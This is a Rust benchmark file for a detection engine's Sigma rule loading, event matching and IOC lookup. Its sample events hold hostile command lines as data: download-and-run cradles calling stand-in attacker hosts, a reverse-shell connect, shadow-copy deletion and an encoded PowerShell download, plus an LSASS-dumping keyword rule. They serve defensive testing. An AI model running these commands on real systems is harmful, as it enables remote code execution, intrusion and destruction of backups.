//! Criterion benchmarks for Thor Firewall Smart Detection Engine
//!
//! Measures:
//!   1. sigma_load_benchmark    – time to load 1000+ rules from disk
//!   2. rule_matching_benchmark – time to match one event against all active rules
//!   3. intel_sync_benchmark    – time to insert 1,000,000 IOC entries into Bloom+DashMap

use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion, Throughput};
use std::path::PathBuf;
use std::time::Duration;

// ─── Sigma rule YAML used for the matching benchmark ─────────────────────────
const SAMPLE_RULE_YAML: &str = r#"
title: Benchmark Rule – LSASS Dump
id: bench-0000-0000-0000-000000000001
status: stable
description: Benchmark rule for measuring detection throughput
author: Benchmark
date: 2025/01/01
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'lsass'
            - 'procdump'
            - 'mimikatz'
    condition: selection
falsepositives:
    - Security tools
level: high
"#;

// ─── Minimal SigmaRule struct (mirrors production) ───────────────────────────
#[derive(Debug, Clone)]
struct SigmaRule {
    id: String,
    title: String,
    patterns: Vec<String>,
}

impl SigmaRule {
    fn matches(&self, event: &str) -> bool {
        self.patterns.iter().any(|p| event.contains(p.as_str()))
    }
}

/// Simulate loading N rules from disk (I/O + YAML parse)
fn load_rules_from_dir(rules_dir: &PathBuf) -> Vec<SigmaRule> {
    let mut rules = Vec::new();
    if !rules_dir.exists() {
        // Synthetic fallback: generate 1000 rules programmatically
        for i in 0..1000_usize {
            rules.push(SigmaRule {
                id: format!("bench-rule-{i:04}"),
                title: format!("Benchmark Rule {i}"),
                patterns: vec![
                    format!("pattern_{i}_alpha"),
                    format!("pattern_{i}_beta"),
                    format!("malware_{i}"),
                ],
            });
        }
        return rules;
    }

    fn walk(dir: &PathBuf, out: &mut Vec<SigmaRule>) {
        let Ok(entries) = std::fs::read_dir(dir) else { return };
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                walk(&path, out);
            } else if path.extension().map(|e| e == "yml").unwrap_or(false) {
                let content = std::fs::read_to_string(&path).unwrap_or_default();
                // Minimal YAML field extraction (no full YAML parser dependency)
                let id = content.lines()
                    .find(|l| l.trim_start().starts_with("id:"))
                    .and_then(|l| l.splitn(2, ':').nth(1))
                    .map(|s| s.trim().to_string())
                    .unwrap_or_else(|| "unknown".into());
                let title = content.lines()
                    .find(|l| l.trim_start().starts_with("title:"))
                    .and_then(|l| l.splitn(2, ':').nth(1))
                    .map(|s| s.trim().to_string())
                    .unwrap_or_else(|| "unknown".into());
                // Extract contains patterns
                let patterns: Vec<String> = content.lines()
                    .filter(|l| l.contains("- '") || l.contains("- \""))
                    .map(|l| {
                        l.trim()
                            .trim_start_matches("- '")
                            .trim_start_matches("- \"")
                            .trim_end_matches('\'')
                            .trim_end_matches('"')
                            .to_string()
                    })
                    .filter(|s| !s.is_empty() && s.len() < 200)
                    .collect();
                out.push(SigmaRule { id, title, patterns });
            }
        }
    }
    walk(rules_dir, &mut rules);
    rules
}

// ─── Benchmark 1: Load 1000+ Sigma rules from filesystem ─────────────────────
fn sigma_load_benchmark(c: &mut Criterion) {
    let rules_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent().unwrap()
        .parent().unwrap()
        .join("rules/sigma");

    let mut group = c.benchmark_group("sigma_load");
    group.measurement_time(Duration::from_secs(10));
    group.sample_size(20);

    group.bench_function("load_all_rules_from_disk", |b| {
        b.iter(|| {
            let rules = load_rules_from_dir(black_box(&rules_dir));
            black_box(rules.len())
        })
    });

    group.finish();
}

// ─── Benchmark 2: Match one event against all active rules ───────────────────
fn rule_matching_benchmark(c: &mut Criterion) {
    // Pre-load rules once
    let rules_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent().unwrap()
        .parent().unwrap()
        .join("rules/sigma");
    let rules = load_rules_from_dir(&rules_dir);
    let rule_count = rules.len();

    // Representative events (worst-case: no match → full scan)
    let events = vec![
        r#"{"Image":"C:\\Windows\\System32\\powershell.exe","CommandLine":"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')","User":"DOMAIN\\victim"}"#,
        r#"{"Image":"/usr/bin/python3","CommandLine":"python3 -c import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',4444))","User":"www-data"}"#,
        r#"{"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"vssadmin delete shadows /all /quiet && wmic shadowcopy delete","User":"NT AUTHORITY\\SYSTEM"}"#,
        r#"{"Image":"/bin/bash","CommandLine":"curl -s http://malware.example.com/dropper.sh | bash","User":"root"}"#,
        r#"{"Image":"C:\\Users\\victim\\AppData\\Local\\Temp\\legit_looking.exe","CommandLine":"legit_looking.exe --update","User":"victim"}"#,
    ];

    let mut group = c.benchmark_group("rule_matching");
    group.measurement_time(Duration::from_secs(15));
    group.throughput(Throughput::Elements(rule_count as u64));

    for (i, event) in events.iter().enumerate() {
        group.bench_with_input(
            BenchmarkId::new("match_event_vs_all_rules", i),
            event,
            |b, ev| {
                b.iter(|| {
                    let matches: Vec<&SigmaRule> = rules.iter()
                        .filter(|r| r.matches(black_box(ev)))
                        .collect();
                    black_box(matches.len())
                })
            },
        );
    }

    group.finish();
}

// ─── Benchmark 3: Bloom Filter + DashMap IOC insertion throughput ─────────────
fn intel_sync_benchmark(c: &mut Criterion) {
    use std::collections::HashSet;

    let mut group = c.benchmark_group("intel_sync");
    group.measurement_time(Duration::from_secs(10));
    group.throughput(Throughput::Elements(1_000_000));

    group.bench_function("insert_1m_iocs_hashset", |b| {
        b.iter(|| {
            let mut store: HashSet<u64> = HashSet::with_capacity(1_000_000);
            for i in 0u64..1_000_000 {
                // Simulate IOC hash (IP, domain, or file hash as u64)
                let ioc_hash = i.wrapping_mul(0x9e3779b97f4a7c15).wrapping_add(0x6c62272e07bb0142);
                store.insert(black_box(ioc_hash));
            }
            black_box(store.len())
        })
    });

    group.bench_function("lookup_1m_iocs_hashset", |b| {
        let mut store: HashSet<u64> = HashSet::with_capacity(1_000_000);
        for i in 0u64..1_000_000 {
            let h = i.wrapping_mul(0x9e3779b97f4a7c15);
            store.insert(h);
        }
        b.iter(|| {
            let mut hits = 0usize;
            for i in 0u64..10_000 {
                let h = i.wrapping_mul(0x9e3779b97f4a7c15);
                if store.contains(black_box(&h)) { hits += 1; }
            }
            black_box(hits)
        })
    });

    group.finish();
}

// ─── Benchmark 4: Aho-Corasick multi-pattern search throughput ───────────────
fn aho_corasick_benchmark(c: &mut Criterion) {
    // Build a large pattern set (simulates Sigma rule keyword index)
    let patterns: Vec<String> = (0..2000)
        .map(|i| format!("malicious_pattern_{i:04}"))
        .collect();

    // Haystack: realistic security event JSON (1 KB)
    let haystack = r#"{"timestamp":"2025-06-15T10:30:00Z","host":"WIN-DC01","Image":"C:\\Windows\\System32\\powershell.exe","CommandLine":"-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA","User":"DOMAIN\\compromised_user","ProcessId":4892,"ParentImage":"C:\\Windows\\System32\\cmd.exe"}"#;

    let mut group = c.benchmark_group("aho_corasick");
    group.measurement_time(Duration::from_secs(10));
    group.throughput(Throughput::Bytes(haystack.len() as u64));

    group.bench_function("manual_string_search_2000_patterns", |b| {
        b.iter(|| {
            let count = patterns.iter()
                .filter(|p| black_box(haystack).contains(p.as_str()))
                .count();
            black_box(count)
        })
    });

    group.finish();
}

criterion_group!(
    benches,
    sigma_load_benchmark,
    rule_matching_benchmark,
    intel_sync_benchmark,
    aho_corasick_benchmark,
);
criterion_main!(benches);
